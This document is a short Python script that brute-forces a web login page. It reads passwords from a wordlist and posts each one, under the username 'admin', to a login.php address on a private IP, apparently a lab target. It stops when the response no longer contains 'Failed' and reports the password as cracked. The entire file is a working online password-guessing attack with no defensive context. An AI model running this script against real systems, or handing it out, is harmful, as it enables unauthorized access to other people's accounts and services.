import requests
import re

wordlist = './passwords.txt'
url = 'http://192.168.231.52/login.php'

words = open(wordlist, 'r').readlines()
fixed = []
for i in words:
	fixed.append(re.sub('\n', '', i))
#print(fixed)

def login(password):
	attempt = requests.post(url, data={
		'username' : 'admin',
		'password' : password
		})
	return attempt.text

for n in fixed:
	if login(n).__contains__('Failed') == True:
		print(f'Trying -- {n}')
	else:
		print(f'Password Cracked!! -- {n}')
		break